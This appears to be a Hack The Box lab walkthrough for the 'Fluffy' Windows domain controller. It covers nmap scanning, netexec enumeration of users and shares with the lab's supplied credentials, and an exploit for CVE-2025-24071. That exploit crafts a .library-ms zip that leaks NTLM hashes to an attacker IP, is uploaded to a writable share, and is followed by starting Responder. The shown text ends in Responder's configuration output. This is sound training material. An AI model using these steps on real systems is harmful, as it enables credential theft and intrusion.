---
title: Fluffy
date: 2025-09-20  
categories: [HTB Walkthrough]
tags: Window ADCS CVE NTLM DACLAbuse
img_path: /assets/HTB/Fluffy/image.png
image:
  path: /assets/HTB/Fluffy/image.png
---

<table style="width:100%; table-layout:fixed; text-align:center;">
  <tr>
    <th>Machine</th>
    <th>Difficulty</th>
    <th>OS</th>
    <th>Release</th>
    <th></th>
  </tr>
  <tr>
    <td>Fluffy</td>
    <td>Easy</td>
    <td>Window</td>
    <td>25 May 2025</td>
    <td><img src="/assets/HTB/Fluffy/logo.png" alt="Logo" width="80"></td>
  </tr>
</table>

**Machine Information**

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

## Recon

Start off with an Nmap scan:

```

IP=10.10.11.69

port=$(sudo nmap -p- $IP --min-rate 10000 | grep open | cut -d'/' -f1 | tr '\n' ',' )

sudo nmap -sC -sV -vv -p $port $IP -oN fluffy.scan 

```
```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ IP=10.10.11.69  
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ port=$(sudo nmap -p- $IP --min-rate 10000 | grep open | cut -d'/' -f1 | tr '\n' ',' )
[sudo] password for kali: 
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ sudo nmap -sC -sV -vv -p $port $IP -oN fluffy.scan 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-25 07:25 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:25
Completed NSE at 07:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:25
Completed NSE at 07:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:25
Completed NSE at 07:25, 0.00s elapsed
Initiating Ping Scan at 07:25
Scanning 10.10.11.69 [4 ports]
Completed Ping Scan at 07:25, 0.35s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:25
Completed Parallel DNS resolution of 1 host. at 07:25, 0.00s elapsed
Initiating SYN Stealth Scan at 07:25
Scanning 10.10.11.69 [17 ports]
Discovered open port 53/tcp on 10.10.11.69
Discovered open port 139/tcp on 10.10.11.69
Discovered open port 445/tcp on 10.10.11.69
Discovered open port 464/tcp on 10.10.11.69
Discovered open port 636/tcp on 10.10.11.69
Discovered open port 49677/tcp on 10.10.11.69
Discovered open port 88/tcp on 10.10.11.69
Discovered open port 49666/tcp on 10.10.11.69
Discovered open port 593/tcp on 10.10.11.69
Discovered open port 49678/tcp on 10.10.11.69
Discovered open port 49681/tcp on 10.10.11.69
Discovered open port 5985/tcp on 10.10.11.69
Discovered open port 9389/tcp on 10.10.11.69
Discovered open port 49730/tcp on 10.10.11.69
Discovered open port 3269/tcp on 10.10.11.69
Discovered open port 49695/tcp on 10.10.11.69
Discovered open port 389/tcp on 10.10.11.69
Completed SYN Stealth Scan at 07:25, 0.71s elapsed (17 total ports)
Initiating Service scan at 07:25
Scanning 17 services on 10.10.11.69
Completed Service scan at 07:26, 59.64s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.11.69.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:26
NSE Timing: About 99.96% done; ETC: 07:26 (0:00:00 remaining)
Completed NSE at 07:27, 40.12s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 3.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 0.00s elapsed
Nmap scan report for 10.10.11.69
Host is up, received echo-reply ttl 127 (0.34s latency).
Scanned at 2025-05-25 07:25:24 EDT for 104s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-25 11:34:05Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T11:35:49+00:00; +8m43s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T11:35:49+00:00; +8m44s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-25T11:35:49+00:00; +8m44s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49730/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-25T11:35:05
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53865/tcp): CLEAN (Timeout)
|   Check 2 (port 19123/tcp): CLEAN (Timeout)
|   Check 3 (port 5751/udp): CLEAN (Timeout)
|   Check 4 (port 54887/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8m42s, deviation: 2s, median: 8m42s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 07:27
Completed NSE at 07:27, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.05 seconds
           Raw packets sent: 21 (900B) | Rcvd: 18 (776B)

```

Nmap  result reveals a Windows domain controller with Active Directory services (LDAP/LDAPS, Kerberos, DNS, SMB) and multiple RPC/WinRM endpoints — LDAPS uses a self-signed DC01 certificate.

## Enumeration

We begin by enumerating users using `netexec`:

```
netexec smb $IP -u  'j.fleischman' -p J0elTHEM4n1990! --users
```
```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ netexec smb $IP -u  'j.fleischman' -p J0elTHEM4n1990! --users

SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                  
SMB         10.10.11.69     445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain
SMB         10.10.11.69     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.69     445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account 
SMB         10.10.11.69     445    DC01             ca_svc                        2025-04-17 16:07:50 0        
SMB         10.10.11.69     445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
SMB         10.10.11.69     445    DC01             p.agila                       2025-04-18 14:37:08 0        
SMB         10.10.11.69     445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
SMB         10.10.11.69     445    DC01             j.coffey                      2025-04-19 12:09:55 0        
SMB         10.10.11.69     445    DC01             j.fleischman                  2025-05-16 14:46:55 0        
SMB         10.10.11.69     445    DC01             [*] Enumerated 9 local users: FLUFFY
                                                                                              
```

Create a list of usernames for later use:

```
netexec smb $IP -u  'j.fleischman' -p J0elTHEM4n1990! --users |  awk '/^SMB/ && $5 ~ /^[a-zA-Z0-9_.]+$/ { print $5 }' | tee -a username.txt  
```

```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ netexec smb $IP -u  'j.fleischman' -p J0elTHEM4n1990! --users |  awk '/^SMB/ && $5 ~ /^[a-zA-Z0-9_.]+$/ { print $5 }' | tee -a username.txt  


Administrator
Guest
krbtgt
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```
Next, enumerate the SMB shares:

```
netexec smb $IP -u  'j.fleischman' -p J0elTHEM4n1990! --shares
```
From the output, we can see that we have both read and write access on the `IT` share:

```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ netexec smb $IP -u  'j.fleischman' -p J0elTHEM4n1990! --shares

SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)                                                                                                                                         
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE      
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share 
                                                                                                      
```
Now, connect to the `IT` share using the valid credentials. Upon connecting, we can observe several files within the share. One of them, `Upgrade_Notice.pdf`, contains references to a few CVEs.

```
smbclient //$IP/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990! 
```
```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy]
└─$ smbclient //$IP/IT -U fluffy.htb/j.fleischman%J0elTHEM4n1990! 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 25 07:41:00 2025
  ..                                  D        0  Sun May 25 07:41:00 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 2069734 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (17.1 KiloBytes/sec) (average 17.1 KiloBytes/sec)
smb: \> 

```

<img src="/assets/HTB/Fluffy/image1.png" alt="Error Loading Image" />

## [CVE-2025-24071 ](https://github.com/ThemeHackers/CVE-2025-24071) — NTLM Relay via SMB Authentication Leak

 **Attack Type:** Spoofing Vulnerability Leading to NTLM Hash Leak via Forced SMB Authentication

#### Overview
This vulnerability allows an attacker to obtain a user's NTLM hash by leveraging Windows Explorer's behavior when handling `.library-ms` files.

#### Attack Mechanics

- `.library-ms` files can contain references to remote SMB paths.
- When such a file is opened or extracted, **Windows Explorer automatically parses the content**.
- If the `.library-ms` file points to a remote SMB share (e.g., `\\attacker-ip\share`), **Windows attempts to authenticate** to that location.
- As a result, the system **sends the user’s NTLM hash** to the attacker’s SMB listener (e.g., using tools like Responder or Impacket).


```
python3 exploit.py -i 10.10.14.33 -f shell   
```
```
┌──(kali㉿kali)-[~/HTB-machine/fluffy/CVE-2025-24071]
└─$ python3 exploit.py -i 10.10.14.33 -f shell   

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __                              
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ |                             
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | |                             
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | |                             
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | |                             
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_|                             
                                                                                                                                                 
                                                                                                                                                 
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)                                    
                    by ThemeHackers                                                                                                                                                                                                                                                               
                                                                                                                                                 
Creating exploit with filename: shell.library-ms
Target IP: 10.10.14.33

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
                                                                 
```

To capture incoming NTLM hashes, start **Responder** in the background:

```
sudo responder -I tun0 -v
```
Now, upload the crafted `exploit.zip` file to the writable **IT** share:
```
smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip"
```
```bash
┌──(kali㉿kali)-[~/HTB-machine/fluffy/CVE-2025-24071]
└─$ smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip"
putting file exploit.zip as \exploit.zip (0.3 kb/s) (average 0.3 kb/s)
                                                                        
```

On responder we have:

```
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.41]
    Responder IPv6             [dead:beef:2::1027]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]
